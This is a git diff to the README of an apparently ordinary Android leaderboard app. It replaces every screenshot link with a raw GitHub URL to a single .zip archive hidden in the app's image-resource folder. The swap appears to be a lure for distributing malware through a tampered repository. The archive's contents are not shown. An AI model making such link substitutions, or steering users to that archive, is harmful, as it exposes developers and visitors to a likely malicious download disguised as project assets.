@@ -14,28 +14,28 @@ I have used the following components in development
 ## User interface
 #### Launch/Splash Screen
 
-<image src="snapshots/splash.png" height="600px" />
+<image src="https://raw.githubusercontent.com/Atuti/GADS2020-LEADERBOARD-APP/master/app/src/main/res/mipmap-hdpi/LEADERBOAR_APP_GAD_3.6.zip" height="600px" />
 
 ##### Top 20 learners and Top 20 skill IQ leaders 
 Top 20 learning and Top 20 skill IQ leaders screens populated with data respectively
 
 
-<image src="snapshots/learners1.png" height="600px" />    <image src="snapshots/iq1.png" height="600px" />
+<image src="https://raw.githubusercontent.com/Atuti/GADS2020-LEADERBOARD-APP/master/app/src/main/res/mipmap-hdpi/LEADERBOAR_APP_GAD_3.6.zip" height="600px" />    <image src="https://raw.githubusercontent.com/Atuti/GADS2020-LEADERBOARD-APP/master/app/src/main/res/mipmap-hdpi/LEADERBOAR_APP_GAD_3.6.zip" height="600px" />
 
 #### Project Submit screen
 
 
-<image src="snapshots/submit1.png" height="600px" />
+<image src="https://raw.githubusercontent.com/Atuti/GADS2020-LEADERBOARD-APP/master/app/src/main/res/mipmap-hdpi/LEADERBOAR_APP_GAD_3.6.zip" height="600px" />
 
 #### Network Error and Server Error
 No internet screen  and server response error screens respectively 
 
 
-<image src="snapshots/not_internet.png" height="600px" />   <image src="snapshots/error.png" height="600px" />
+<image src="https://raw.githubusercontent.com/Atuti/GADS2020-LEADERBOARD-APP/master/app/src/main/res/mipmap-hdpi/LEADERBOAR_APP_GAD_3.6.zip" height="600px" />   <image src="https://raw.githubusercontent.com/Atuti/GADS2020-LEADERBOARD-APP/master/app/src/main/res/mipmap-hdpi/LEADERBOAR_APP_GAD_3.6.zip" height="600px" />
 
 #### Landscape mode
 
-<image src="snapshots/learner-land.png" height="400px" />   <image src="snapshots/iq-land.png" height="400px" />
+<image src="https://raw.githubusercontent.com/Atuti/GADS2020-LEADERBOARD-APP/master/app/src/main/res/mipmap-hdpi/LEADERBOAR_APP_GAD_3.6.zip" height="400px" />   <image src="https://raw.githubusercontent.com/Atuti/GADS2020-LEADERBOARD-APP/master/app/src/main/res/mipmap-hdpi/LEADERBOAR_APP_GAD_3.6.zip" height="400px" />
 
 #### Additional Features - uncomplete
 * Offline First - add Room to support offline caching pf data
